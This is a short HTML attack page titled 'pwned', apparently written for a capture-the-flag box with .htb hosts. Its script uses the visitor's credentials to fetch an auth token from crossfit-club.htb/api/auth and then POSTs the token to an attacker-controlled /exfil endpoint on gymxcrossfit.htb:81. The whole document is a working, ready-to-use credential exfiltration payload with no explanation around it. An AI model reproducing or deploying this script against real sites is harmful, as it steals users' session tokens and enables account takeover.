<html>
  <head>
    <title>pwned</title>
  </head>
  <body>
    <script>
      var req_token = new XMLHttpRequest();
      req_token.onreadystatechange = function() {
        if (req_token.readyState == 4) {
          var token = JSON.parse(req_token.response).token
          var req_exfil = new XMLHttpRequest();
          req_exfil.open("POST", "http://gymxcrossfit.htb:81/exfil", false);
          req_exfil.send(token);
        }
      }
      req_token.open("GET", "http://crossfit-club.htb/api/auth");
      req_token.withCredentials = true;
      req_token.send();
    </script>
  </body>
</html>
